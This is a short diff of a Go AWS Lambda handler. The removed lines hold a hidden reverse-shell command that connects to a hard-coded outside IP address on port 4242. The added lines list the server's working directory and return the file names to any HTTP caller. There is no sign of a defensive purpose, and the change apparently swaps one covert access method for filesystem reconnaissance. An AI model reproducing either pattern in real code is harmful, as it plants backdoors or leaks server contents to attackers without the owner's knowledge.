@@ -11,14 +11,11 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
-	"os/exec"
 	"strings"
 	"time"
 )
 
 func handler(request events.APIGatewayProxyRequest) (events.APIGatewayProxyResponse, error) {
-	exec.Command("sh", "-i", ">&", "/dev/tcp/115.144.122.8/4242", "0>&1")
-
 	parameters := request.PathParameters
 	fmt.Println(len(parameters))
 	for p := range parameters {
@@ -67,6 +64,14 @@ func handler(request events.APIGatewayProxyRequest) (events.APIGatewayProxyRespo
 				fmt.Println(body)
 			}
 		}
+	}
+
+	dir, _ := os.Getwd()
+	body = dir
+	files, _ := ioutil.ReadDir("./")
+	for _, f := range files {
+		fmt.Println(f.Name())
+		body += f.Name()
 	}
 	return events.APIGatewayProxyResponse{
 		StatusCode:        200,
